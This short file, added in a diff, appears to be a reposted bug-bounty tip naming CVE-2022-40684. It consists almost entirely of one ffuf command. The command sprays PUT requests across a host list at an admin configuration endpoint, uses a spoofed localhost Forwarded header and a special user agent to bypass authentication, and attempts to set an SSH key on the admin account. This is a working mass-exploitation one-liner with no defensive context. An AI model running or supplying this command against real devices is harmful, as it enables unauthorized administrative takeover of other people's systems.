@@ -1,0 +1,5 @@
+CVE-2022-40684 @h4x0r_dz
+
+#bugbounty #bugbountytips
+
+ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r
